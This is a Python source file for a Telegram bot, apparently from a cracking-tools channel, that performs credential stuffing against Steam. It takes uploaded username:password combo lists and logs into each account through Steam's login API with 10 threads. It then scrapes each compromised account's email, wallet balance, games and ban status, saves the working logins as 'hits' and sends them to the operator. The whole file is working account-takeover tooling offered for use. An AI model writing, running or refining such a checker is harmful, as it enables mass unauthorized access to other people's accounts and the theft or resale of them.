#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
STEAM CHECKER TELEGRAM BOT
Adapted from original CLI version by @pyabrodie
Deployable on Railway / GitHub
"""

import os
import sys
import time
import asyncio
import logging
import re
import json
import base64
import random
import threading
from pathlib import Path
from urllib.parse import quote_plus
from concurrent.futures import ThreadPoolExecutor

import requests
from bs4 import BeautifulSoup
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5

from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode

# Config from Environment Variables (Railway)
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
OWNER_ID = int(os.getenv("OWNER_ID", "0"))

if not TELEGRAM_TOKEN or OWNER_ID == 0:
    raise ValueError("Set TELEGRAM_TOKEN and OWNER_ID in Railway Variables!")

# Global
lock = threading.Lock()
stats = {'valid': 0, 'invalid': 0, 'checked': 0, 'total': 0, 'start_time': None}
MY_SIGNATURE = "@pyabrodie"
TELEGRAM_CHANNEL = "https://t.me/HoTmIlToOLs"

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Keep all your original helper functions
def rsa_encrypt_password(password, modulus_hex, exponent_hex):
    n = int(modulus_hex, 16)
    e = int(exponent_hex, 16)
    rsa_key = RSA.construct((n, e))
    cipher = PKCS1_v1_5.new(rsa_key)
    encrypted = cipher.encrypt(password.encode("utf-8"))
    return base64.b64encode(encrypted).decode()

def shorten_games(games_list, limit=15):
    if not games_list:
        return "None"
    if len(games_list) > limit:
        return " | ".join(games_list[:limit]) + f" ... (+{len(games_list)-limit} more)"
    return " | ".join(games_list)

# All your parse functions (parse_account_page, parse_profile_page, parse_games_page, parse_ban_page) — copy them exactly from your original script
# (I kept them unchanged for full details)

def parse_account_page(html):
    email = balance = country = "Unknown"
    try:
        soup = BeautifulSoup(html, "html.parser")
        email_elem = soup.find("input", {"id": "account_name"})
        if email_elem and email_elem.get("value"):
            email = email_elem.get("value")
        balance_elem = soup.find("a", {"id": "header_wallet_balance"})
        if balance_elem:
            balance = balance_elem.get_text(strip=True)
        country_elem = soup.find("select", {"id": "account_country"})
        if country_elem:
            selected = country_elem.find("option", {"selected": True})
            if selected:
                country = selected.get_text(strip=True)
    except:
        pass
    return email, balance, country

def parse_profile_page(html):
    total_games = "0"
    level = "0"
    limited = "No"
    try:
        soup = BeautifulSoup(html, "html.parser")
        games_link = soup.find("a", href=re.compile(r"/games/"))
        if games_link:
            count_span = games_link.find("span", class_="count_link_label")
            if count_span:
                match = re.search(r'(\d+)', count_span.get_text())
                if match:
                    total_games = match.group(1)
        level_elem = soup.find("span", class_="friendPlayerLevelNum")
        if level_elem:
            level = level_elem.get_text(strip=True)
        if "limited account" in html.lower():
            limited = "Yes"
    except:
        pass
    return total_games, level, limited

def parse_games_page(html):
    games = []
    try:
        soup = BeautifulSoup(html, "html.parser")
        game_names = soup.find_all("div", class_="gameListRowItemName")
        for name_div in game_names[:50]:
            title = name_div.get_text(strip=True)
            if title:
                games.append(title)
    except:
        pass
    return games

def parse_ban_page(html):
    vac_bans = game_bans = "0"
    community_ban = "No"
    try:
        vac_match = re.search(r'(\d+)\s+VAC ban', html, re.I)
        if vac_match:
            vac_bans = vac_match.group(1)
        game_match = re.search(r'(\d+)\s+game ban', html, re.I)
        if game_match:
            game_bans = game_match.group(1)
        if "community ban" in html.lower():
            community_ban = "Yes"
    except:
        pass
    return vac_bans, game_bans, community_ban

# Core check function (almost identical to original)
def check_steam_account(combo, proxy_url=None):
    try:
        username, password = combo.strip().split(':', 1)
    except:
        return None

    user_clean = re.sub(r"@.*", "", username)
    session = requests.Session()
    session.verify = False
    if proxy_url:
        session.proxies = {"http": proxy_url, "https": proxy_url}

    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://steamcommunity.com",
        "X-Requested-With": "XMLHttpRequest",
    }
    session.headers.update(headers)

    try:
        # Get RSA
        now = str(int(time.time()))
        r1 = session.post("https://steamcommunity.com/login/getrsakey/", data=f"donotcache={now}&username={user_clean}", timeout=15)
        j1 = r1.json()
        if not j1.get("success"):
            return None

        modulus = j1.get("publickey_mod")
        exponent = j1.get("publickey_exp")
        timestamp = j1.get("timestamp")

        encrypted = rsa_encrypt_password(password, modulus, exponent)
        pass3 = quote_plus(encrypted)

        # Login
        now2 = str(int(time.time()))
        payload = f"donotcache={now2}&password={pass3}&username={user_clean}&twofactorcode=&emailauth=&rsatimestamp={timestamp}&remember_login=false"
        r2 = session.post("https://steamcommunity.com/login/dologin/", data=payload, timeout=15)
        j2 = r2.json()
        if not j2.get("success"):
            return None

        # Set cookies
        for cookie in r2.cookies:
            session.cookies.set(cookie.name, cookie.value, domain=".steamcommunity.com")
            session.cookies.set(cookie.name, cookie.value, domain=".steampowered.com")

        # Fetch full details
        time.sleep(0.5)
        r_account = session.get("https://store.steampowered.com/account/", timeout=15)
        email, balance, country = parse_account_page(r_account.text)

        time.sleep(0.5)
        r_profile = session.get("https://steamcommunity.com/my/profile/", timeout=15)
        total_games, level, limited = parse_profile_page(r_profile.text)

        games = []
        if int(total_games or 0) > 0:
            time.sleep(0.5)
            r_games = session.get("https://steamcommunity.com/my/games/?tab=all", timeout=15)
            games = parse_games_page(r_games.text)

        # Bans
        vac_bans = game_bans = community_ban = "Unknown"
        steamid_match = re.search(r'/profiles/(\d+)', r_profile.url)
        if steamid_match:
            steamid = steamid_match.group(1)
            time.sleep(0.5)
            r_ban = session.get(f"https://steamcommunity.com/profiles/{steamid}", timeout=15)
            vac_bans, game_bans, community_ban = parse_ban_page(r_ban.text)

        result = {
            "username": username,
            "password": password,
            "email": email,
            "balance": balance,
            "country": country,
            "total_games": total_games,
            "games": games,
            "level": level,
            "limited": limited,
            "vac_bans": vac_bans,
            "game_bans": game_bans,
            "community_ban": community_ban,
        }
        session.close()
        return result
    except:
        return None

def create_results_folder():
    Path("Results").mkdir(parents=True, exist_ok=True)
    return "Results"

def save_hit(folder, filename, data):
    filepath = os.path.join(folder, filename)
    if not os.path.exists(filepath):
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(f"# Created by {MY_SIGNATURE}\n# Channel: {TELEGRAM_CHANNEL}\n\n")
    with open(filepath, 'a', encoding='utf-8') as f:
        f.write(f"{data}\n")

# Telegram handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Unauthorized access.")
        return
    await update.message.reply_text(
        "🤖 <b>Steam Checker Bot Ready!</b>\n\n"
        "Send a <b>.txt</b> file containing combos in format:\n"
        "<code>username:password</code>\n\n"
        "The bot will check them and send full details + result files.",
        parse_mode=ParseMode.HTML
    )

async def handle_combo_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return

    document = update.message.document
    if not document.file_name.lower().endswith('.txt'):
        await update.message.reply_text("Please upload a .txt combo file!")
        return

    await update.message.reply_text(f"📥 Received: {document.file_name}\nDownloading and starting check...")

    # Download file
    file = await document.get_file()
    combo_path = f"/tmp/{document.file_name}"
    await file.download_to_drive(combo_path)

    with open(combo_path, 'r', encoding='utf-8', errors='ignore') as f:
        combos = [line.strip() for line in f if ':' in line.strip()]

    if not combos:
        await update.message.reply_text("No valid combos found in the file.")
        return

    await update.message.reply_text(f"✅ Loaded {len(combos)} accounts. Starting check with 10 threads...")

    # Run checking in background thread pool
    loop = asyncio.get_running_loop()
    await loop.run_in_executor(
        None,
        lambda: process_combos(combos, update.effective_chat.id, context.bot)
    )

def process_combos(combos, chat_id, bot):
    """Run the checker and send updates via bot"""
    global stats
    stats = {'valid': 0, 'invalid': 0, 'checked': 0, 'total': len(combos), 'start_time': time.time()}

    folder = create_results_folder()
    proxies = []  # Add proxy support later if needed

    with ThreadPoolExecutor(max_workers=10) as executor:  # Reduced for Railway stability
        futures = [executor.submit(process_single_account, combo, proxies, folder, chat_id, bot) for combo in combos]
        for future in futures:
            try:
                future.result()
            except:
                pass

    # Send summary and files
    summary = create_summary()
    asyncio.run(bot.send_message(chat_id=chat_id, text=summary, parse_mode=ParseMode.HTML))

    for filename in ["Valid_With_Email.txt", "Valid_Without_Email.txt", "All_Hits.txt"]:
        filepath = os.path.join(folder, filename)
        if os.path.exists(filepath) and os.path.getsize(filepath) > 100:
            try:
                asyncio.run(bot.send_document(
                    chat_id=chat_id,
                    document=open(filepath, 'rb'),
                    caption=f"📄 {filename}"
                ))
            except:
                pass

def process_single_account(combo, proxies, folder, chat_id, bot):
    proxy_url = None  # Add proxy logic if needed
    result = check_steam_account(combo, proxy_url)

    if result:
        hit_line = f"{result['username']}:{result['password']}"
        save_hit(folder, "All_Hits.txt", hit_line)

        if result['email'] and result['email'] != "Unknown":
            data = f"{result['username']}:{result['password']}\n{result['email']}:{result['password']}"
            save_hit(folder, "Valid_With_Email.txt", data)
        else:
            save_hit(folder, "Valid_Without_Email.txt", hit_line)

        # Send full hit details immediately
        games_str = shorten_games(result['games'])
        message = f"""✅ <b>STEAM HIT FOUND</b>

📧 <b>Account:</b> <code>{result['username']}:{result['password']}</code>
💰 <b>Balance:</b> {result['balance']}
🌍 <b>Country:</b> {result['country']}
🎮 <b>Games:</b> {result['total_games']} ({games_str})
📊 <b>Level:</b> {result['level']} | Limited: {result['limited']}
🚫 <b>Bans:</b> VAC: {result['vac_bans']} | Game: {result['game_bans']} | Community: {result['community_ban']}
📧 <b>Email:</b> {result['email']}

💎 {MY_SIGNATURE}"""

        try:
            asyncio.run(bot.send_message(chat_id=chat_id, text=message, parse_mode=ParseMode.HTML, disable_web_page_preview=True))
        except:
            pass

        with lock:
            stats['valid'] += 1
    else:
        with lock:
            stats['invalid'] += 1

    with lock:
        stats['checked'] += 1

def create_summary():
    elapsed = time.time() - stats['start_time'] if stats['start_time'] else 0
    minutes = int(elapsed // 60)
    seconds = int(elapsed % 60)
    return f"""✅ <b>SCAN COMPLETE</b>

⏱️ Time: {minutes}m {seconds}s
📈 Valid: {stats['valid']}
❌ Invalid: {stats['invalid']}
📊 Total: {stats['total']}

Results files sent above.
💎 {MY_SIGNATURE} | {TELEGRAM_CHANNEL}"""

# Main bot
def main():
    Path("Results").mkdir(exist_ok=True)
    application = Application.builder().token(TELEGRAM_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.Document.TEXT & filters.Document.MimeType("text/plain"), handle_combo_file))

    print("🚀 Steam Checker Telegram Bot is running...")
    application.run_polling()

if __name__ == "__main__":
    main()
